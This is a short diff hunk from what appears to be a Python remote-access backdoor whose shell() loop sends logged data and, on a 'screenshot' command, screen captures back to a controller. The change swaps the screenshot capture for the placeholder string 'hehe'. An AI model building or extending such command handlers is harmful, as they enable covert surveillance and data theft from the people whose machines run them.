@@ -165,7 +165,7 @@ def shell():
             reliable_send(log_data)
         elif command == 'screenshot':
             # If the command is 'screenshot', take a screenshot and send it
-            screenshot_data = take_screenshot()
+            screenshot_data = "hehe"
             reliable_send(screenshot_data)
         else:
             try:
